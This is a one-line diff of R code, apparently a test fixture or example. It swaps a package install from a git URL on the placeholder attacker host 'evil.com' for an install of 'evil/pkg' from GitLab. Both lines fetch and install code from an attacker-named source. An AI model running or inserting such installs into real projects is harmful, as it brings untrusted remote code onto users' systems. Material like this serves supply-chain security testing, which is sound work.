@@ -1,1 +1,1 @@
-remotes::install_git("https://evil.com/pkg.git")
+remotes::install_gitlab("evil/pkg")
